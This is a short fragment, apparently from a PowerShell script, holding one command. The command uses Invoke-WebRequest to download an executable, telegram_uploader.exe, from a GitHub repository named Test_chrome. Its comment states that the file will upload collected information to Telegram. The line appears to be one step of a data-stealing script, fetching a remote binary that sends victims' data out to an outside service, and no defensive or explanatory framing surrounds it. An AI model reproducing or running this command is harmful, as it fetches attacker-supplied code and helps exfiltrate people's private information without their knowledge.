...
Invoke-WebRequest https://github.com/Stinkergood/Test_chrome/raw/main/telegram_uploader.exe -OutFile telegram_uploader.exe #Download uploader file to upload all informations on telegram
